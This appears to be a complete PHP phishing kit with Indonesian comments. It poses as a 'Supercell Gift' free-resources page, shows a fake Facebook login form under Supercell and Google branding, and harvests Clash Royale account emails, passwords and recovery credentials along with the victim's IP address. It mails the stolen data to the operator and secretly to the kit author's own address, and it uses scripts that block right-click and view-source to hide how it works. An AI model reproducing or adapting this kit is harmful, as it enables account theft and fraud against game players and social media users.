<?php
#############################################
##       Author :       DIANSPEDIA          ##
##       Mailer :       DIANSPEDIA          ##
##       Modifer :      DIANSPEDIA          ##
#############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG, NANTI ERROR */

$username = $_POST['username'];
$email = $_POST['email'];
$pass = $_POST['pass'];
$hp = $_POST['hp'];
$townhall = $_POST['townhall'];
$country= $_POST['country'];
$city= $_POST['city'];
$emailr = $_POST['emailr'];
$pw = $_POST['pw'];
$xp = $_POST['xp'];
$ip = $_SERVER['REMOTE_ADDR'];

$emailkamu = 
"emailanda@gmail.com"; //GANTI EMAILMU DIMARI GAN UNTUK RESULT CLASH ROYALE
$tomail = $emailkamu; 

$subject = "Clash Royale[$username]ARENA[$townhall]IP[$ip]";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>DIANS MAILER</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
NAMA :  <b>'.$username.'</b>
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:0px;background:red">
				EMAIL
			</th>
			<th style="color:white;padding:3px;background:red">
				PASS
			</th>
			<th style="color:white;padding:3px;background:red">
				ARENA
			</th>
<th style="color:white;padding:3px;background:red">
				XP
			</th>
<th style="color:white;padding:3px;background:red">
				HP
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$email.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$pass.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$townhall.'</b>
			</td>
<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$xp.'</b>
			</td>
<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$hp.'</b>
			</td>
		</tr>
	</tbody>
</table>
<hr style="color:red">
RECOVERY : <b>'.$emailr.'</b>
PASSWORD : <b>'.$pw.'</b>
<hr style="color:red">
<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b>Kota/Negara</b></font></div>
</center>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
NEGARA:  <b>'.$country.' | KOTA :  <b>'.$city.'</b>
<hr style="color:red">
<table width=100% align=center >
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b> IP '.$ip." | ".$link." | ".$nama_negara." On ".gmdate('r').'</b>		
			</td>
 <hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> 2017- DIANS</b></font></div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: SETOR Clash Royale <zahran@kasep>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
$p = 
"dianspedia@gmail.com"; //*Jangan Dihapus Ini alamat Script Phising nya ,,kalo gamau error jangan diubah ea PAHAM *//
$datamail = mail($p,$subject, $message, $headersx);
?>
<html><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="http://image.spreadshirtmedia.com/image-server/v1/designs/1001927163,width=280,height=280?mediaType=png" rel="icon" type="image/x-png">
<title> SUPERCELL GIFT - Get Free Resources From Supercell</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;
}
.col-md-8 {
 margin:0 auto;
 float:none;
}
</style>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
</head><body style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; cursor: default;"><div align="center"><noscript>
<div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
<div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;"> Mohon aktifkan javascript pada browser untuk mengakses halaman ini! </div></div>
</noscript></div>
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
}
</style>
<style type="text/css">
img {
-webkit-touch-callout: none;
-webkit-user-select: none;
}
</style>
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
<div class="registration">
<form id="frmLoginUI" name="frmLoginUI" method="post" action="successfully.php" onsubmit="return validate();"><div style="display:none"><input type="hidden" name="csrfmiddlewaretoken" value="UX8ogBv3k7w8XeR8SHNYr6GVbYvGKzlL"></div>
<div style="padding:0px;margin:0 auto;" class="container ">
<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<center style="background:url(background1.jpg);"><br>
<div class="col-md-8">
<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="img/nwcr.jpg"/>
<div style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 >
  Log-In In Your Facebook Account
  </h4><br/><form id="glogin">
<div style="width:100%" class="form-group">
<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="img/facebook.png"/>
  <input class="form-control" name="nama"  placeholder="First Name" type="text" required>
<br>  
 <input class="form-control" name="emailfb"  placeholder="Email" type="text" required>
  <input class="form-control" name="passfb"  placeholder="Password" type="password" required>
<br>

<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="NEXT STEP"> </form>
</div>
</div><br><br>
</div>
<p></p>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>From Supercell & Google</p></center>
<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2017 Google Inc.</p>
</div>
</h4></div>
</div>
<audio src="http://mboxmp3.com/u/DownloadLaguGratis.Org-clash-of-clans-clan-wars-song.mp3" autoplay="autoplay"> </audio></td>
</center></div></div></body></html>